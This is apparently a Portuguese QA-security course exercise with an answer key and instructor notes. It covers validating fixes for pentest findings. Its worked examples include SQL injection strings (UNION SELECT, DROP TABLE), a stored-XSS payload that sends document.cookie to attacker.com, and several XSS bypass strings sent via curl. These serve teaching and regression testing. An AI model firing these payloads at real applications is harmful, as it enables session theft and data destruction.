---
exercise_id: lesson-2-3-exercise-2-validar-correcoes
title: "Exercício 2.3.2: Validar Correções de Pentest"
lesson_id: lesson-2-3
module: module-2
difficulty: "Intermediário"
last_updated: 2026-01-24
---

# Exercício 2.3.2: Validar Correções de Pentest

## 📋 Enunciado Completo

Time de dev corrigiu 5 vulnerabilidades do pentest. Validar se correções são efetivas.

### Tarefa
1. Reproduzir exploits originais do pentest
2. Testar correções (exploit ainda funciona?)
3. Testar variações (bypass possível?)
4. Validar com pentester (se disponível)
5. Documentar validação

---

## ✅ Soluções Detalhadas

### Solução Esperada

**Validação profissional:**
```markdown
## Validação de Correção: SQL Injection em /checkout

### Exploit Original (do relatório)
\`\`\`bash
curl -X POST https://app.exemplo.com/checkout \
  -d "item_id=1' OR '1'='1' --"
# Resultado ANTES: Retornou todos os pedidos (VULNERÁVEL)
\`\`\`

### Tentativa Após Correção
\`\`\`bash
curl -X POST https://app.exemplo.com/checkout \
  -d "item_id=1' OR '1'='1' --"
# Resultado DEPOIS: 400 Bad Request (CORRIGIDO ✅)
\`\`\`

### Tentativas de Bypass
1. \`item_id=1" OR "1"="1" --\` → Bloqueado ✅
2. \`item_id=1 UNION SELECT * FROM users --\` → Bloqueado ✅
3. \`item_id=1; DROP TABLE orders; --\` → Bloqueado ✅

### Código Corrigido Revisado
\`\`\`python
# ANTES (vulnerável)
query = f"SELECT * FROM orders WHERE id={item_id}"

# DEPOIS (corrigido)
query = "SELECT * FROM orders WHERE id = ?"
cursor.execute(query, (item_id,))
\`\`\`

### Conclusão
✅ **CORREÇÃO EFETIVA**
- Exploit original bloqueado
- 3 variações testadas, todas bloqueadas
- Código usa prepared statements corretamente
- Recomendação: APROVAR para produção
```

---

## 📊 Critérios de Avaliação

### ✅ Essenciais
- [ ] Reproduziu exploit original
- [ ] Testou após correção
- [ ] Validou que correção funciona

### ⭐ Importantes
- [ ] Testou variações (tentativas de bypass)
- [ ] Revisou código corrigido
- [ ] Documentou processo de validação

### 💡 Diferencial
- [ ] Automatizou teste de regressão
- [ ] Validou com pentester externo
- [ ] Criou teste de integração permanente

---

## 🎓 Pontos Importantes para Monitores

### Conceitos-Chave Avaliados

1. **Validação Técnica**: Consegue reproduzir exploits e testar correções?
2. **Pensamento de Atacante**: Testa variações (bypasses) ou apenas POC original?
3. **Code Review**: Valida a qualidade da correção (não apenas comportamento)?
4. **Documentação**: Processo de validação está documentado para auditoria?

### Erros Comuns

**Erro 1: "Testou apenas exploit original"**
- **Situação**: Aluno testou POC do relatório mas não tentou bypasses
- **Feedback**: "Atacantes não desistem após primeira tentativa. Teste ao menos 3-5 variações: aspas duplas, UNION, time-based SQLi, etc. Isso valida ROBUSTEZ da correção, não apenas se POC específico foi corrigido. Refaça testando variações."

**Erro 2: "Não revisou código"**
- **Situação**: Aluno validou apenas comportamento (teste black-box)
- **Feedback**: "Teste funcional valida comportamento, mas code review valida COMO foi corrigido. Correção pode funcionar mas ser frágil (ex: blocklist de caracteres ao invés de prepared statements). Acesse código corrigido e valide que usa padrão seguro."

**Erro 3: "Marcou como corrigido sem evidências"**
- **Situação**: Aluno disse 'está corrigido' sem documentar testes
- **Feedback**: "Validação sem evidências = não é auditável. Documente: 1) POC original (antes/depois), 2) Tentativas de bypass (screenshots/logs), 3) Code review (diff do código). Auditorias compliance exigem rastro de validação."

**Erro 4: "Não testou regressão funcional"**
- **Situação**: Correção bloqueou exploit MAS quebrou funcionalidade
- **Feedback**: "Correção de segurança NÃO PODE quebrar funcionalidade. Após validar que exploit não funciona, valide cenários de USO LEGÍTIMO: usuário válido consegue fazer checkout? Performance OK? Teste regressão funcional é obrigatório."

**Erro 5: "Não comunicou resultado para dev"**
- **Situação**: Aluno validou mas não deu feedback para desenvolvedor
- **Feedback**: "Feedback rápido acelera ciclo. Assim que validar correção: 1) Aprovado? Comente no PR/ticket ('Validado ✅, pode mergear'), 2) Reprovado? Explique O QUÊ falta ('Bypass X ainda funciona, veja screenshot'). Comunicação ágil é essencial."

**Erro 6: "Confiou cegamente na correção do dev"**
- **Situação**: Aluno assumiu que dev corrigiu sem validar
- **Feedback**: "'Trust but verify'. Dev pode ter corrigido incorretamente ou parcialmente. QA Security SEMPRE valida: 1) Reproduza exploit, 2) Confirme que não funciona mais, 3) Revise código. Validação independente é responsabilidade do QA."

### Dicas para Feedback Construtivo

**Para validação profissional:**
> "Excelente validação de correção! Você demonstrou rigor técnico ao: 1) Reproduzir exploit original, 2) Testar múltiplas variações de bypass, 3) Revisar código corrigido, 4) Documentar processo com evidências. Essa é a validação de um QA Security sênior. Próximo nível: crie teste automatizado que garante que essa vulnerabilidade não volta (teste de regressão permanente)."

**Para validação básica:**
> "Boa validação! Você testou POC original e confirmou correção. Para melhorar: 1) Teste ao menos 3 variações de bypass (atacantes tentam contornar correção), 2) Revise código (valide que usa padrão seguro, não apenas workaround), 3) Documente com screenshots/logs (evidências para auditoria). Sua validação está funcional, agora profundidade."

**Para dificuldades:**
> "Vejo que você teve dificuldades em reproduzir exploit. Vamos simplificar: 1) Use Burp Suite ou Postman ao invés de curl (mais visual), 2) Copie POC EXATO do relatório (aspas, espaços importam), 3) Compare resposta ANTES vs DEPOIS. Se ainda travar, agende monitoria. Reprodução é habilidade essencial para QA Security."

### Contexto Pedagógico

**Por que este exercício é fundamental:**

1. **Ciclo de Remediação**: QA fecha o loop de correção (identifica → dev corrige → QA valida)
2. **Validação Independente**: Dev pode ter corrigido incorretamente; QA valida imparcialmente
3. **Pensamento de Atacante**: Desenvolve mindset de tentar bypasses (security testing)
4. **Code Review de Segurança**: Ensina a avaliar qualidade da correção, não apenas comportamento
5. **Documentação para Compliance**: Processos auditáveis (ISO 27001, PCI-DSS) exigem validação documentada

**Conexão com o Curso:**
- **Pré-requisito**: Exercício 2.3.1 (Interpretar Relatório de Pentest)
- **Aplica conceitos**: Exploitation, Bypass Techniques, Code Review, Teste de Regressão
- **Prepara para**: Exercício 2.3.4 (Post-Mortem), Módulo 3 (Segurança por Setor)
- **Integra com**: Exercício 2.1.4 (Validar Findings SAST) - mesma lógica, contextos diferentes

**Habilidades desenvolvidas:**
- Reprodução de exploits (technical)
- Bypass techniques (security mindset)
- Code review (technical + critical thinking)
- Documentação para auditoria (compliance)

**Estatísticas da indústria:**
- 25% das correções de vulnerabilidades são incompletas ou incorretas (OWASP, 2024)
- Validação independente reduz re-trabalho em 60% (Forrester, 2025)
- QAs que fazem code review de segurança são 2x mais efetivos (SANS, 2024)

**Processo de validação profissional:**

**Checklist de Validação Completa:**
1. ✅ Reproduzir exploit original (POC do pentest)
2. ✅ Testar após correção aplicada (exploit bloqueado?)
3. ✅ Testar 3-5 variações de bypass (robustez da correção)
4. ✅ Revisar código corrigido (qualidade da implementação)
5. ✅ Testar regressão funcional (correção não quebrou feature)
6. ✅ Validar em múltiplos ambientes (staging + produção)
7. ✅ Documentar evidências (screenshots, logs, diff de código)
8. ✅ Comunicar resultado para dev e pentester

**Ferramentas recomendadas:**
- Burp Suite (proxy, repeater, intruder)
- curl (testes scriptados)
- Postman (APIs)
- Browser DevTools (frontend)
- Git diff (code review)

**Matriz de validação:**

| Resultado do Teste | Conclusão | Ação |
|-------------------|-----------|------|
| Exploit original bloqueado + 0 bypasses funcionaram + código correto | ✅ Correção efetiva | Aprovar produção |
| Exploit original bloqueado + alguns bypasses funcionaram | ⚠️ Correção parcial | Feedback para dev (refazer) |
| Exploit original ainda funciona | ❌ Correção inefetiva | Rejeitar, reabrir ticket |
| Correção funciona mas quebrou feature | ⚠️ Regressão | Ajustar correção (balance security + functionality) |

**Exemplo de validação end-to-end:**

```markdown
## Validação Completa: XSS Stored em /comments

### 1. Exploit Original (Pentest Report)
```bash
# POST comment com payload XSS
curl -X POST https://app.exemplo.com/api/comments \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"comment": "<script>fetch(\"https://attacker.com/?c=\"+document.cookie)</script>"}'

# ANTES da correção:
# - Comment postado com sucesso
# - Todos que visitam a página executam script
# - Cookies enviados para atacante.com
```

### 2. Código Corrigido
```javascript
// ANTES (vulnerável)
app.post('/api/comments', (req, res) => {
  const comment = req.body.comment;
  db.insert({text: comment});  // Sem sanitização
});

// DEPOIS (corrigido)
const DOMPurify = require('isomorphic-dompurify');

app.post('/api/comments', (req, res) => {
  const comment = DOMPurify.sanitize(req.body.comment);
  db.insert({text: comment});
});
```

### 3. Teste Após Correção
```bash
# Mesmo payload
curl -X POST https://staging.exemplo.com/api/comments \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"comment": "<script>alert(1)</script>"}'

# DEPOIS da correção:
# Response: {"comment": "&lt;script&gt;alert(1)&lt;/script&gt;"}
# ✅ HTML entities, script não executa
```

### 4. Tentativas de Bypass (5 variações)
```bash
# Bypass 1: img tag
curl -X POST ... -d '{"comment": "<img src=x onerror=alert(1)>"}'
# Resultado: Sanitizado ✅

# Bypass 2: svg
curl -X POST ... -d '{"comment": "<svg onload=alert(1)>"}'
# Resultado: Sanitizado ✅

# Bypass 3: iframe
curl -X POST ... -d '{"comment": "<iframe src=javascript:alert(1)>"}'
# Resultado: Sanitizado ✅

# Bypass 4: evento em atributo
curl -X POST ... -d '{"comment": "<div onmouseover=alert(1)>Hover</div>"}'
# Resultado: Sanitizado ✅

# Bypass 5: polyglot
curl -X POST ... -d '{"comment": "javascript:/*--></title></textarea></script><svg/onload=alert(1)//"}'
# Resultado: Sanitizado ✅
```

**Conclusão: ✅ CORREÇÃO ROBUSTA**
- 5 de 5 bypass attempts bloqueados
- DOMPurify é library industry-standard (Netflix, Google usam)
- Validação: APROVADO para produção

### 5. Teste de Regressão Funcional
```bash
# Cenário legítimo: usuário posta comment normal
curl -X POST ... -d '{"comment": "Ótimo produto! Recomendo."}'
# ✅ Comment aparece normalmente (não quebrou funcionalidade)

# Cenário edge case: comment com HTML legítimo
curl -X POST ... -d '{"comment": "Preço: <b>R$ 100</b>"}'
# ✅ Sanitizado mas mantém formatação (DOMPurify permite <b>, <i>, etc)
```

### 6. Comunicação para Dev
```
PR #1234: ✅ Validado - Aprovado para Merge

@backend-dev: Validei correção do XSS Stored. Testei 5 bypass attempts, todos bloqueados.
DOMPurify está correto. Funcionalidade normal OK.

✅ Pode fazer merge com confiança.

Evidências: [link para screenshots]
```
```

---

**Última atualização**: 2026-01-24  
**Elaborado por**: Joelma Prestes Ferreira e Yago Palhano  
**Revisado por**: [A definir]
